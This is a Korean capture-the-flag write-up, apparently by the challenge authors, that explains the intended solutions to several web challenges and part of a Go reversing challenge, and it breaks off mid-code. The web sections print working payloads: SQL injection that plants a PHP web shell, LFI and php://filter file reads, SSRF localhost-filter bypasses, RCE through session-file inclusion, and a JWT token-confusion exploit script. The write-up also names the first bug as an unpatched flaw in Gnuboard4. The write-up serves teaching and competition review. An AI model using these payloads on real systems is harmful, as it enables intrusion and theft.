RCE를 위해 해당 문제에서 사용해야할 것은 "/var/lib/php/sessions/" 경로에 있는 PHP 세션 파일을 사용하는 것 밖에는 없으므로 봐야할 것은 nickname과 userid에 PHP 코드를 넣을 수 있게 SQLI 인젝션을 생각할 수 밖에 없다.

mysqli_real_escape_string 함수를 사용하면 SQLI 취약점을 막을 수 있지만 해당 함수를 사용한뒤에 xss_filter 함수를 사용했기 때문에 SQLI 취약점이 일어날 곳은 여기밖에 없다.

```php
$xmldata = xss_filter(mysqli_real_escape_string($dbc, $data));
$query = 'update users set xmldata="'.$xmldata.'" where userid="'.mysqli_real_escape_string($dbc, $_SESSION['userid']).'";';
$res = mysqli_query($dbc, $query);

```

그 후 xss_filter를 자세히 살펴보면 아래와 같은 함수를 찾을 수 있다.

```php
   if (function_exists("html_entity_decode"))
    {
        $data = html_entity_decode($data); 
    }

```

xss를 방어하기 위해서 html_entity_decode함수를 사용하는데 여기에서 문제가 발생한다.

만약 aaaa"bbbb 를 사용한다면 어떻게 될까?

위 데이터가 html_entity_decode를 거치면 아래와 같이 변환된다.

```php
aaaa"bbbb

```

따라서 우리는 quot문자를 사용할 수 있고 update 문에서 SQLI가 발생하게 할 수 있다.

### 공격 코드

```php
aaaa&quot;, nickname=&quot;<?php system($_GET[x]);

```

### 변환된 공격 코드

```php
aaaa", nickname="<?php system($_GET[x]);

```

사실 이렇게만 보면 아주 간단하고 쉬운 문제이지만, 이 문제를 내게된 배경이 있다.

xss_filter 함수는 그누보드4에서 사용되는 "xss_clean" 함수 이고 제로데이 취약점이였다. 지금은 그누보드5가 배포되고 있어서 문제는 없지만 아직도 그누보드4 배포본 에서는 제로데이 취약점으로 남아 있다.

그누보드4에서는 "common.php"에서 mysqli_real_escape_string 대용으로 addslashes 함수를 이용해 서버로 오는 변수에 대해 전체적으로 SQLI를 방어하고 "extract($_GET);", "extract($_POST);"를 사용하여 서버에 오는 변수를 그대로 PHP 변수로 사용할 수 있다.

```php
if( !get_magic_quotes_gpc() )
{
	if( is_array($_GET) )
	{
		while( list($k, $v) = each($_GET) )
		{
			if( is_array($_GET[$k]) )
			{
				while( list($k2, $v2) = each($_GET[$k]) )
				{
					$_GET[$k][$k2] = addslashes($v2);
				}
				@reset($_GET[$k]);
			}
			else
			{
				$_GET[$k] = addslashes($v);
			}
		}
		@reset($_GET);
	}

same $_POST ...

same $_COOKIE ...
}

```

그래서 아래와 같이 사용하면 취약점을 발견하기 힘들다. 언뜻 보면 게시판에서 xss를 방어하는 것 같지만 xss_clean 함수 때문에 SQLI 취약점이 일어난다.

```php
$query = "update board set title='$title', body='".xss_clean($body)."', '$userid' ...... ";

```

babyweb 문제를 내면서 취약점을 쉽게 알아볼 수 있도록 login.php, join.php 등에서는 작은 따옴표를 사용했고, getxmldata.php에서는 큰 따옴표를 사용했으며, SQLI 취약점을 직관적으로 알아볼 수 있도록 mysqli_real_escape_string을 전역적으로 사용하지 않고 xss_filter함수와 같이 보이게 사용하였다.

```php
$query = xss_filter(mysqli_real_escape_string(데이터));
```


<br/>


<br/>



## CatDog

---

![/assets/bob/bob923.png](/assets/bob/bob923.png)
```
lfi + sqli + ssrf
description의 cat은 php, dog은 python flask를 의미한다.

8888포트로 돌고 있는 php는 flag 파일의 read 권한이 없기 때문에 내부에서 돌고 있는 flask를 이용하여 flag 파일을 읽어오는 것이 목표임.
이 flask 서버는 localhost만 접근 가능하다.

웹서버에서 일반적으로 가지는 'www-data' 권한이 아닌 'php' 유저로 돌아간다는 설명이 flask 포트를 얻을 수 있는 힌트임.

lfi를 통해 flask 포트를 알아낸 후 ssrf를 이용하여 flask 서비스에 접근하면 /flag path에서 passcode를 요구한다. 이 passcode는 sqli를 이용하여 얻어낼 수 있다.

/flag?passcode=@@@@와 같이 passcode를 입력하면 플래그를 얻을 수 있다.
```

### 1. index.php 소스코드 추출 + lfi 취약점

![/assets/bob/bob924.png](/assets/bob/bob924.png)

![/assets/bob/bob925.png](/assets/bob/bob925.png)

- 메인페이지에서 view-source를 하면 68번째 라인에 주석으로 `index.php/?source` 가 있다.

```php
<?php
    include_once "header.php";
    include_once "config.php";
    if(isset($_GET['source'])){
        echo "<div style='margin-top: 6rem;'/>";
        highlight_file(__FILE__);
        die();
    }
    
    $page = $_GET["page"];
    if(isset($page) and is_string($page)){
        if(preg_match("/.php/", $page) === 0){
            $page .= ".php";
        }

        if(preg_match("/(login|register)/", $page) === 0 && $_SESSION["username"] == null){
            echo "<script>alert('Please Login!');location.href='/?page=login';</script>";
            die();
        }
        include $page;
        die();
    }
?>
<!-- index.php/?source -->
<div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
    <div>
        <img src="/images/bg.jpg" style="width: 100%; height: 80vh; object-fit: cover; opacity: 0.5"/>
    </div>
    <div style="display: flex; justify-content: center;">
        <div style="font-size: 4rem;">
            meow
        </div>
    </div>
</div>
```

- `index.php/?source` 에 접근하면 `index.php` 의 소스코드를 얻을 수 있다.
- `$page` 파라미터를 include하는 것으로 보아 lfi 취약점이 발생할 수 있는 가능성을 볼 수 있다.

```php
        if(preg_match("/.php/", $page) === 0){
            $page .= ".php";
        }
```

- `$page` 파라미터에 `.php` 가 존재하지 않을 경우 마지막에 `.php` 를 추가하는 코드가 있지만, 해당 정규표현식은 `.php` 가 존재하기만 한다면 우회가 가능하다.
- 따라서 `/?page=/.php/../../../../../../etc/issue` 와 같은 페이로드를 통해 file leak이 가능하다.
- 또한, `/?page=php://filter/convert.base64-encode/resource=articles` 와 같이  php wrapper를 이용하여 서비스에 존재하는 php 소스코드를 모두 leak하는 것이 가능하다.

### 2. ssrf 취약점

![/assets/bob/bob926.png](/assets/bob/bob926.png)

- 다음으로 articles를 보면 글 작성 시 이미지가 자동으로 첨부되는 것을 확인할 수 있는데, 이 이미지를 mypage에서 변경할 수 있다.

![/assets/bob/bob927.png](/assets/bob/bob927.png)

```php
<!-- ... -->

<?php
    if(isset($_POST["type"])){
        sleep(3);
        $url = trim($_POST["url"]);

        if(preg_match("/^(http\:\/\/|https\:\/\/)/", $url) === 0 || preg_match("/(127\.0\.0\.1|localhost)/", $url) === 1){
            echo("<script>alert('Don\'t hack!');location.href='/?page=mypage';</script>");
            die();
        }

        if(!isset($url) || $url == ""){
            echo("<script>alert('Enter the image URL!');location.href='/?page=mypage';</script>");
            die();
        }

        if($_POST["type"] === "p"){
            $data = base64_encode(file_get_contents($url));
            $src = "data: png;base64,${data}";
            echo "<img src='${src}' style='height: 40vh; width: 100%; object-fit: cover;'/>";
        }

        else if($_POST["type"] === "o"){
            $stmt = $sql->prepare("update user set img = ? where username = ?");
            $stmt->bind_param('ss', $url, $_SESSION["username"]);
            $stmt->execute();
        
            $result = $stmt->get_result();
            echo "<script>alert('Complete.');location.href='/?page=articles'</script>";
        }
    }
?>

<!-- ... -->
```

- mypage의 코드를 확인해보면 preview를 눌렀을 때 `file_get_contents` 를 이용하여 `url` 의 값을 가져온 후 base64로 인코딩하여 이미지를 보여준다.
- 이 때 `file_get_contents` 를 이용한 file leak을 방지하기 위해 `http/https scheme` 를 강제하였으며, `localhost` 와 `127.0.0.1` 의 값을 막아두었다.
- 여기서 도메인을 `localhost` 와 `127.0.0.1` 대신 `http://0` 이나 10진수 표현 `http://213070643` 또는 16진수 표현 `http://0x7F000001` 등을 사용하여 우회하면 ssrf 취약점이 발생한다.

### 3. 힌트

![/assets/bob/bob928.png](/assets/bob/bob928.png)

- 다시 문제 description을 살펴보면 주머니에 `개` 를 숨겨두었으며, 플래그를 가지고 있다고 한다. 현재로선 개가 어떤 `개` 가 어떤 것을 의미하는지 알 수 없다.
- 다음으로, 하단의 박스를 확인해보면 웹서버가 `www-data` 가 아닌 `php` 유저로 돌고 있다는 것을 확인할 수 있다.
- 웹서버의 유저를 변경하여 사용하는 경우는 특수한 경우이기 때문에, 의심해볼 여지가 있다.

![/assets/bob/bob929.png](/assets/bob/bob929.png)

- php 계정에 대한 힌트를 얻었으니, lfi 취약점을 이용해 `/etc/passwd` 파일을 확인해보자.
- 해당 파일에는 php 계정과 python 계정이 존재하며, `/home/php` 와 `/home/python` 가 홈 디렉토리로 지정되어 있다. 또한, 계정 접근 시 `/bin/bash` 를 사용하는 것으로 보아 쉘을 사용한다는 것을 유추할 수 있다.

![/assets/bob/bob930.png](/assets/bob/bob930.png)

- `php` 계정 홈 디렉토리에 존재하는 `.bash_history` 를 확인해보면 `localhost` 의 2026 포트로 `curl` 요청을 날리는 것을 확인할 수 있다. 이를 통해 문제 description의 `개` 가 웹 서비스라는 것을 알 수 있다.
- 해당 포트에서 돌고 있는 웹 서비스는 `localhost` 에서만 접근이 가능하도록 설정하였기 때문에, 이전에 발견했던 `ssrf` 취약점을 통해 요청을 해야만 한다.

### 4. 숨겨진 웹 서비스(dog) 요청

![/assets/bob/bob931.png](/assets/bob/bob931.png)

- `mypage` 에서 `http://0:2026` 으로 `preview` 를 요청하면 정상적으로 요청되는 것을 확인할 수 있다.

```
http://0:2026

Well done! Go to /flag
```

- 하단의 이미지를 `새 탭에서 열기` 등을 이용하여 데이터를 확인해보면 `localhost` 의 2026 포트로 돌고 있는 `웹 서비스` 를 확인할 수 있으며, `/flag` path로 이동하라는 메시지가 나타난다.

```
http://0:2026/flag

Usage : /flag?passcode=
/flag has a delay for 3sec.
Do not bruteforce!
```

- `/flag` path에 접근하면 `passcode` 를 요구한다. `mypage` 페이지와 동일하게 3초의 딜레이를 가지고 있는 것을 확인할 수 있다.

```
http://0:2026/flag?passcode=1234

Wrong passcode!
Go back to PHP... You can get the passcode in PHP
```

- 아무 `passcode` 를 입력하면 위와 같은 안내 메시지가 나타난다. 현재 서비스에서 `passcode` 를 얻을 수 있는 방법이 없기 때문에 `php` 서비스로 돌아가자.

### 5. sql injection → passcode 확인

![/assets/bob/bob932.png](/assets/bob/bob932.png)

- `articles.php` 페이지의 상단을 보면 검색 박스가 있는 것을 확인할 수 있다.

```php
<!-- ... -->

<?php
		  $s = $_GET["search"];
		  $search = "%${s}%";
		  
		  $page = $_GET["p"];
		  if(!isset($page) || $page == "" || !is_numeric($page)){
		      $page = 1;
		  }
		  else{
		      $page = intval($page);
		  }
		  $page -= 1;
		  if($page < 0) $page = 0;
		  $start = $page*10;
		  
		  if(preg_match("/(\ |\n|\t|\r|@|insert|update|delete|=|like|admin|substr|concat|-|ascii|`|load|into|clue|text\")/i", $search) === 1){
		      echo "<script>alert('Don\'t hack!');history.back();</script>";
		      die();
		  }
		  $query = "select id, title, content, author, img from board where title like '${search}' or content like '${search}' order by id desc limit ${start}, 10";
		  $result = mysqli_query($sql, $query);
		
			while ($row = mysqli_fetch_array($result)){
					echo "<li onclick=\"location.href='/?page=view&id=${row['id']}';\">";
					echo "<img src=\"${row['img']}\" style=\"width: 100%; height: 20vh; object-fit: cover; \">";
					echo '<div class="post-info">';
					echo '<div class="post-basic-info">';
					echo "<h3><a href=\"#\">${row['title']}</a></h3>";
			              echo "<p>${row['content']}</p>";
			              echo "<span><a href=\"#\">Writer: ${row['author']}</a></span>";
					echo '</div>';
					echo '</div>';
					echo '</li>';
		  }
?>

<!-- ... -->
```

- `articles.php` 의 코드를 확인해보면 검색 구문에서 `sql injection` 취약점이 발생한다는 것을 알 수 있다.
- 하지만 상단의 정규표현식에서 어느 정도의 공백과 `=`, `like` 등을 필터링 하고 있기 때문에 이를 적절히 우회하여 필요한 정보를 얻어내야 한다.

![/assets/bob/bob933.png](/assets/bob/bob933.png)

- 공백이 필터링 되었으니 `\x0b` 또는 `/**/` 등의 주석을 이용하여 공백을 대체하고, `like` 와 `=` 가 필터링 되었으니 `in` 을 사용하여 비교를 해주자.
- `sql injection`을 통해 해당 데이터베이스 내의 테이블 리스트를 추출하였으며, 그 중 `p4SSc0D3` 테이블이 존재하는 것을 확인할 수 있다.

![/assets/bob/bob934.png](/assets/bob/bob934.png)

- `p4SSc0D3` 테이블의 컬럼명은 `passcode`인 것을 확인할 수 있다.

![/assets/bob/bob935.png](/assets/bob/bob935.png)

### 6. flag 확인

- `passcode`는 `5UP3R_S3CUR3_STR0NG_P4S5C0D3` 인 것을 확인했으니, 이전에 확인한 웹 서비스(개)에 `passcode`를 입력하면 `flag`를 얻을 수 있다.

![/assets/bob/bob936.png](/assets/bob/bob936.png)

- FLAG : bob{sabeon_eun_gaein_juiya}

### 7. 여담 (1)

![/assets/bob/bob937.png](/assets/bob/bob937.png)

- `sql injection`을 통해 `admin` 테이블과 `clue` 테이블이 있는 것을 확인할 수 있다.

```php
// ...

if(preg_match("/(\ |\n|\t|\r|@|insert|update|delete|=|like|admin|substr|concat|-|ascii|`|load|into|clue|text\")/i", $search) === 1){
    echo "<script>alert('Don\'t hack!');history.back();</script>";
    die();
}

// ...
```

- 하지만 대회 서비스 중 `articles.php` 의 필터링으로 인해 `clue` 와 `admin` 모두 접근이 불가능한 상태였다.
- `admin` 테이블은 `admin 계정` 의 평문 패스워드를 저장해두었다.

```php
<!-- ... -->

<?php
    if($_SESSION["username"]){
        if($_SESSION["username"] === "admin"){
            echo "<li><a href=\"/?page=readme\"><span>Readme</span></a></li>";
        }
        echo "<li style=\"position: absolute; left: 10rem;\"><a href=\"#\" style=\"cursor: default;\"><span>USER : ${_SESSION['username']}</span></a></li>";
        echo '<li style="position: absolute; right: 10rem;"><a href="/?page=mypage"><span>Mypage</span></a></li>';
        echo '<li style="position: absolute; right: 3rem;"><a href="/?page=logout"><span>Logout</span></a></li>';
    }
    else{
        echo '<li style="position: absolute; right: 3rem;"><a href="/?page=login"><span>Login</span></a></li>';
    }
?>

<!-- ... -->
```

- 그리고 `admin 계정` 으로 로그인하면 `readme.php` 페이지에 접근할 수 있는 메뉴가 생긴다.

```php
<!-- ... -->

<?php
    if($_SESSION["username"] !== "admin"){
        echo '<script>alert("Invalid access.");history.back();</script>';
        die();
    }

    $stmt = $sql->prepare("select text from clue where 1 limit 1");
    $stmt->execute();

    $result = $stmt->get_result();
    $row = $result->fetch_assoc();
    
    $data = file_get_contents($row["text"]);

    
    echo $data;
?>

<!-- ... -->
```

- `readme.php` 페이지는 `clue` 테이블에 존재하는 힌트 메시지를 받아와 출력해주는 역할을 한다.

![/assets/bob/bob938.png](/assets/bob/bob938.png)

- 대회 전 날, 잠결에 코드 수정하다 `admin` 문자열을 필터링에 넣는 바람에,, `admin 계정` 의 패스워드를 알아내지 못하게 되어 힌트 페이지가 사라지게 되었다.
- 이를 인지했을 땐 이미 solver가 나왔기 때문에 수정할 수 없어 힌트 페이지는 없었던 것으로,,, 되었다.
- 위 스크린샷이 이제는 들어갈 수 없어져버린 `힌트 페이지` 다.

### 8. 여담 (2) → Unintended Solution

- `이진*`, `김경*` 님께서 위에 설명했던 `/home/php/.bash_history` 참조를 통한 풀이가 아닌 `rce` 로 문제를 풀이하여, 이에 대한 설명도 진행하겠다.
- lfi와 sqli의 과정은 동일하다.

![/assets/bob/bob939.png](/assets/bob/bob939.png)

- 헤더 메뉴를 확인해보면, 로그인 시 `USER : {USERNAME}` 의 형태로 출력되는 것을 확인할 수 있다.

```php
<!-- ... -->

<?php
    if($_SESSION["username"]){
        if($_SESSION["username"] === "admin"){
            echo "<li><a href=\"/?page=readme\"><span>Readme</span></a></li>";
        }
        echo "<li style=\"position: absolute; left: 10rem;\"><a href=\"#\" style=\"cursor: default;\"><span>USER : ${_SESSION['username']}</span></a></li>";
        echo '<li style="position: absolute; right: 10rem;"><a href="/?page=mypage"><span>Mypage</span></a></li>';
        echo '<li style="position: absolute; right: 3rem;"><a href="/?page=logout"><span>Logout</span></a></li>';
    }
    else{
        echo '<li style="position: absolute; right: 3rem;"><a href="/?page=login"><span>Login</span></a></li>';
    }
?>

<!-- ... -->
```

- `header.php` 를 확인해보면 `$_SESSION['username']` 으로 세션에 저장된 username을 가져온다.
- username에 `<?=eval($_GET[0])?>` 와 같은 PHP expression tag를 사용하여 eval 코드를 삽입한 후 회원가입 및 로그인한다.
- 이후 일반적으로 세션이 저장되는 위치인 `/var/lib/php/session/` 디렉토리의 `sess_{PHPSESSID}` 파일을 lfi 취약점을 통해 include하여 `rce` 한다.

![/assets/bob/bob940.png](/assets/bob/bob940.png)

![/assets/bob/bob941.png](/assets/bob/bob941.png)

![/assets/bob/bob942.png](/assets/bob/bob942.png)

- 위와 같이 `rce` 를 진행한 후, python flask 소스코드가 있는 `/app` 디렉토리를 찾아 해당 `/app/app.py` 를 읽어 포트 번호를 알아낸다.
- 그리고 `curl 명령어` 또는 `ssrf 취약점` 을 이용하여 `http://localhost:2026/flag` 페이지에 접근하여 플래그를 획득한다.

- php 계정은 `/flag` 파일에 대한 읽기 권한이 없기 때문에 `cat /flag`  또는 `lfi 취약점` 으로는 읽을 수 없다.


<br/>


<br/>



## JWT-Extended

---

![/assets/bob/bob943.png](/assets/bob/bob943.png)

```
안전하지 않은 Flask-JWT-Extended 모듈 사용

- JWT 토큰을 전송하는 방법을 여러 가지로 시도해볼 수 있다.
- 문제에서 /flag로 아무런 값을 넣지 않고 접근해보면 다음과 같은 msg를 받을 수 있다. 여기서 cookies or headers 라는 문구를 통해 토큰 값을 적절히 넣어줄 곳을 예상할 수 있다.
```


![/assets/bob/bob944.png](/assets/bob/bob944.png)

- Cookie와 Header를 번갈아가며 만료되거나 만료되지 않은 값을 삽입한 후 전송하게 되면 풀리는 문제다.

### 문제 상세 설명

- 원래의 문제 소스는 아래와 같다.

```python
#!/usr/bin/env python3
from flask import (
    Flask,
    request,
    jsonify
)
from flask_jwt_extended import (
    JWTManager,
    jwt_required,
    create_access_token,
    decode_token,
    get_jwt_identity,
)

from jwt.utils      import base64url_decode
from jwt.algorithms import get_default_algorithms

import datetime, time, json
 

def is_expired(token):
    if decode_token(token, allow_expired=True)['exp'] < int(time.time()):
        return True   
    
    return False

def create_app(config="app.config.Config"):
    # Setup flask
    app = Flask(__name__)

    app.config.from_object(config)

    @app.route("/")
    def index():
        return "POST : /login <br>\nGET : /flag"
    
    # Standard login endpoint
    @app.route('/login', methods=['POST'])
    def login():
        try:
            username = request.json.get('username', None)
            password = request.json.get('password', None)
        except:
            return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
    
        if username != 'admin' or password != 'admin':
            return jsonify({"msg": "Bad username or password"}), 401
    
        access_token = create_access_token( identity=username,
                                            expires_delta=datetime.timedelta(minutes=1))

        ret = {
            'access_token': access_token,
        }
    
        return jsonify(ret), 200
    
    @app.route('/flag', methods=['GET'])
    @jwt_required
    def flag():
        try:
            access_token = request.headers.get("Authorization").split()[1]
        except:
            return jsonify({"msg"           : "No Token!"})

        current_user = get_jwt_identity()
        
        if current_user == 'admin' and is_expired(access_token):
            # Here your Flag / It is not Race condition
            return jsonify({"Good For You"  : app.config['FLAG']})
        else:
            return jsonify({"msg"           :"Not Expired Token!"})
    

    with app.app_context():
        app.config['JWT_SECRET_KEY']     = app.config['SECRET']
        app.config['JWT_TOKEN_LOCATION'] = ['cookies', 'headers']
        jwtmanager                       = JWTManager(app)

        return app
```

- 위의 문제에서 요구하는 것은 /flag 로 접근하여 **`@jwt_required`**를 통과한 후, flag 함수를 실행하지만, **`get_jwt_identity()`** 함수와 **`is_expired()`** 함수를 통해 현재 토큰이 만료되어야만 flag를 전달해주는 형태의 문제이다.
- 첫 번째로 jwt_required라는 decorator에서는 request에서 받아온 JWT의 상태를 체크하고, 정상적인 토큰(만료 상태, 시그니처 확인 등)인 가를 확인한다. 즉, 정상적으로 서버에서 발행한 토큰이어야 한다는 의미이다.
- 두 번째로 access_token에서 Authorization 헤더에 있는 토큰을 받아와 해당 토큰이 정상적인지 체크하여 expired 되었는지 확인하는 루틴이 있다. 단, 여기서도 get_jwt_identity() 함수로 토큰을 검사하기 때문에 서버에서 발행한 정상적인 토큰을 사용해야 한다.
- 따라서 위의 문제의 컨셉은 **JWT가 만료되지 않았지만, 만료되어야 풀리**는 문제로, 로지컬한 취약점을 의도한 것이다. 먼저 문제 풀이에 앞서 Flask-JWT-Extended 오픈소스에 대한 설명이 필요할 것 같다.

### Flask-JWT-Extended

- Flask에는 다양한 Extended 모듈이 있는데, 그 중 하나로 JWT에 대한 모듈이 있다. pyjwt를 사용해도 무방하나, 보다 유연한 코드 작성과 관리를 위해 Flask-JWT-Extended를 추천한다.
- [**Document**](https://flask-jwt-extended.readthedocs.io/en/stable/)를 살펴보면 Basic Usage에서 보여주는 것과 같이 **`Header`**를 통해 JWT를 사용하는 것과 **`Query(get)`**, **`JSON(post)`**, **`Cookie`**그리고 총 네 가지 방법으로 사용이 가능하다.
- 이를 처리하는 루틴을 먼저 파악해보도록 하자.
- flask-jwt-extended 의 view_decorator 소스

```python
# https://github.com/vimalloc/flask-jwt-extended/blob/master/flask_jwt_extended/view_decorators.py
def _decode_jwt_from_request(request_type):
    # All the places we can get a JWT from in this request
    get_encoded_token_functions = []

    locations = config.token_location

    # add the functions in the order specified in JWT_TOKEN_LOCATION
    for location in locations:
        if location == 'cookies':
            get_encoded_token_functions.append(
                lambda: _decode_jwt_from_cookies(request_type))
        if location == 'query_string':
            get_encoded_token_functions.append(_decode_jwt_from_query_string)
        if location == 'headers':
            get_encoded_token_functions.append(_decode_jwt_from_headers)
        if location == 'json':
            get_encoded_token_functions.append(
                lambda: _decode_jwt_from_json(request_type))

    # Try to find the token from one of these locations. It only needs to exist
    # in one place to be valid (not every location).
    errors = []
    decoded_token = None
    jwt_header = None
    for get_encoded_token_function in get_encoded_token_functions:
        try:
            encoded_token, csrf_token = get_encoded_token_function()
            decoded_token = decode_token(encoded_token, csrf_token)
            jwt_header = get_unverified_jwt_headers(encoded_token)
            break
        except NoAuthorizationError as e:
            errors.append(str(e))

    # Do some work to make a helpful and human readable error message if no
    # token was found in any of the expected locations.
    if not decoded_token:
        token_locations = config.token_location
        multiple_jwt_locations = len(token_locations) != 1

        if multiple_jwt_locations:
            err_msg = "Missing JWT in {start_locs} or {end_locs} ({details})".format(
                start_locs=", ".join(token_locations[:-1]),
                end_locs=token_locations[-1],
                details="; ".join(errors)
            )
            raise NoAuthorizationError(err_msg)
        else:
            raise NoAuthorizationError(errors[0])

    verify_token_type(decoded_token, expected_type=request_type)
    verify_token_not_blacklisted(decoded_token, request_type)
    return decoded_token, jwt_header
```

- 위와 같이 for 반복문을 이용하여 **`location`** 토큰이 있을 것이라 미리 선언되어 있던 위치를 모두 확인하여 **`get_encoded_token_functions`**에 append 한다. 이때 location은 config.py에 **JWT_TOKEN_LOCATION**으로 선언하거나 **app.config['JWT_TOKEN_LOCATION']**에 선언할 수 있다.

```python
    for get_encoded_token_function in get_encoded_token_functions:
        try:
            encoded_token, csrf_token = get_encoded_token_function()
            decoded_token = decode_token(encoded_token, csrf_token)
            jwt_header = get_unverified_jwt_headers(encoded_token)
            break
        except NoAuthorizationError as e:
            errors.append(str(e))
```

- 이때 위와 같이 get_encoded_token_functions에 append된 모든 위치에서 토큰을 파싱하는 것이 아니라 append된 순서대로 token을 검사하되, **하나가 정상적으로 파싱되었을 경우, 뒤의 토큰은 무시하도록 코드가 작성**되어 있다.  따라서 토큰의 위치가 여러 곳으로 지정할 경우 로지컬한 취약점이 발생할 수 있고, 이번 문제의 컨셉 또한 이와 동일하다.
- 다시 문제로 돌아와 눈여겨봐야 할 것은 **app.config['JWT_TOKEN_LOCATION']**이다.

```python
    with app.app_context():
        app.config['JWT_SECRET_KEY']     = app.config['SECRET']
        app.config['JWT_TOKEN_LOCATION'] = ['cookies', 'headers']
        jwtmanager                       = JWTManager(app)

        return app
```

- JWT 토큰의 위치가 cookies, 그리고 headers로 되어 있다. **`jwt_required`**와 `**get_jwt_identity()**`에서는 cookies에 선언된 JWT Token을 통해 검증하게 된다. 그러나 인위적으로 Authorization 헤더를 통해 검증하는 곳에서는 **`_decode_jwt_from_request`**에서 return하는 토큰과는 다르다.
- 이와 같은 검사 루틴을 통해 검증할 경우 로지컬한 취약점이 발생할 수 있기 때문에 Flask-JWT-Extended의 경우 해당 모듈에서 제공하는 함수로 토큰 검사 및 검증 값을 반환할 수 있도록 하는 것이 권장된다.

```python
# exploit.py
import requests
import json
import jwt

requests.packages.urllib3.disable_warnings()

# Get Token
url     = "http://ctf.kkamikoon.com/"
headers = { "Content-Type"  : "application/json; charset=utf-8" }
data    = { "username"      : "admin",
            "password"      : "admin" }

res     = requests.post(url=url + "login", headers=headers, data=json.dumps(data), verify=False)
new     = json.loads(res.text)['access_token']

# Expired JWT == Exploit JWT
exploit_jwt     = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1OTc4NTc4MzcsIm5iZiI6MTU5Nzg1NzgzNywianRpIjoiMzQyYjNlZTItMzQ1My00Y2IzLWFjYzgtZjMxMzcyYjU3NGEwIiwiZXhwIjoxNTk3ODU3ODAwLCJpZGVudGl0eSI6Imd1ZXN0IiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIiwiY3NyZiI6IjRmNGE4YTk3LTdiNDEtNGZiMy1iYzcxLTE0YjBiODM3ZmQyNSJ9.pJYyoZjq-6l06TQ6ugfQZjoHtSClEhW_6AvXzYjAQM8" # expired
exploit_headers = {
    "Authorization" : f"Bearer {exploit_jwt}",
    "Cookie"        : f"access_token_cookie={new}"
}

res     = requests.get(url=url + "flag", headers=exploit_headers, verify=False)

print(res.text)
```


<br/>


<br/>



# 🖥️ REVERSING

## gocat

---

![/assets/bob/bob945.png](/assets/bob/bob945.png)

```
golang 리버싱 & 간단한 역연산 / 0 solver
```
- 주어진 문제 파일을 다운로드받고 바이너리를 ida로 열게되면 아래와 같이 심볼이 살아있지 않은 것처럼 보인다.

![/assets/bob/bob946.png](/assets/bob/bob946.png)

- 하지만 golang은 코드 작성시 사용한 패키지와 여러 함수에 대한 정보들을 `gopclntab` 섹션에 저장한다. 해당 섹션에 저장 시, 아래와 같은 구조체를 가진다.

```cpp
struct _FUNCTIONINFO {
	QDWORD lpFunctionAddr,
	QDWORD qdNameOffset
}
```

- 따라서, 해당 섹션의 구조체를 파싱해서 오디팅을 진행하면 된다. 하지만 이 작업들은 너무 많은 노동이 필요하므로 누군가 만들어놓은 [ida golang assist](https://github.com/strazzere/golang_loader_assist)를 사용하면 아래의 그림과 같이 비교적 깔끔한 함수명을 확인 할 수 있다.

![/assets/bob/bob947.png](/assets/bob/bob947.png)

- 위와 같이 assist를 사용해 함수명을 바꿔준 이후, main_main함수를 찾아서 디컴파일한다.

![/assets/bob/bob948.png](/assets/bob/bob948.png)

- main_main함수를 대략적으로 살펴보면 어느정도 구조가 눈에 들어오게 되는데 다음과 같은 pseudo code로 되어있음을 알 수 있고, 역연산이 충분히 가능한 구조인 것 또한 알 수 있다.

```python
# pseudo code
seed = time.unixtime()
srand(seed);

for i in range(256):
	table[i] = rand()

flag = input()
if len(flag) > 44:
	exit(0)

result = []
for i in range(44):
	result += [ getRandom() * table[getIndex((1 << i) % 256)] + flag[i] ]

for i in range(44):
	print(i, result[i])
```

- 여기서 추가적으로 분석해야할 것은 getIndex함수인데, 해당 함수를 살펴보면 다음과 같다.

![/assets/bob/bob949.png](/assets/bob/bob949.png)

- 재귀적으로 호출하는 것을 볼 수 있는데, 정상적으로 디컴파일이 되지 않는다. 이러한 이유 때문에 어셈 코드를 보아야한다.

![/assets/bob/bob950.png](/assets/bob/bob950.png)

![/assets/bob/bob951.png](/assets/bob/bob951.png)

- 위의 두 그림에서 볼 수 있듯, eax가 getIndex함수에서 스택으로 들어가는 것을 확인할 수 있고 대략적으로 아래와 같이 동작하는 것을 확인할 수 있다.

```python
def getIndex(depth):
	if depth < 2:
		return 1
	return (getIndex(depth - 2) + getIndex(depth - 1)) % 256
```

- 위의 식대로 계산을 하면 피보나치 수열임을 알 수 있는데, 이를 재귀적으로 구현했기 때문에 40번째 수열 값을 계산하기 위해서 적지않은 계산이 필요하게 된다. 그러므로 memorization 이나 간단하게 미리 배열로 계산을 해주면 된다.
- 위의 작업들을 모두 합쳐서, 역연산을 하기 위한 poc를 작성하면 다음과 같다.

```go
package main

import (
   "fmt"
   "math/rand"
   "time"
)
var memory []int

func getIndex(idx int) int {
   if memory[idx] != 0 {
      return memory[idx]
   }
   if idx < 2 {
      memory[idx] = 1
      return 1
   }
   result := (getIndex(idx - 2) + getIndex(idx - 1)) & 0xFF
   memory[idx] = result
   return result
}

func getRandom(r *rand.Rand) int {
   return r.Int()
}

func main() {
   memory = make([]int, 0x100)
   flag_enc := []uint32{
2069409670, 2964128287, 2354096995, 3032984546, 10510900, 2544990927, 2926778951, 552570446, 1853857527, 3973419442, 3048538325, 1902664467, 420185447, 2658384181, 2929871612, 4151170943, 7446955, 2503536331, 1899187641, 3227466824, 3596188763, 2770886128, 3598361089, 3417226313, 2440643422, 157914802, 380458138, 2585576567, 3413857472, 2292452225, 2949469921, 3191119812, 3830151779, 783135889, 801108861, 50993623, 2780019976, 283706417, 64541485, 3786109553, 4159600537, 2979925216, 3157377353, 420734285,
   }
   for unix := time.Now().Unix(); unix > 0; unix-- {
      r := rand.New(rand.NewSource(unix))
      table := make([]uint8, 0x100)

      for i := 0; i < 0x100; i++ {
         table[i] = uint8(getRandom(r))
      }
      prefix := []byte("bob")
      found := true

      for i := 0; i < len(prefix); i++ {
         calc := int(prefix[i]) + int(table[getIndex(((1 << uint32(i)) % 256))]) * getRandom(r)
         if uint32(calc) != flag_enc[i] {
            found = false
            break
         }
      }
      if found == true {
         fmt.Println("[+] Found flag")
         flag := make([]byte, len(flag_enc))
         for i := len(prefix); i < len(flag_enc); i++ {
            flag[i] = byte(int(uint32(flag_enc[i])) - int(table[(getIndex((1 << uint32(i) % 256)))]) * getRandom(r))
         }
         fmt.Println("flag => ", string(prefix) + string(flag))
         return
      }
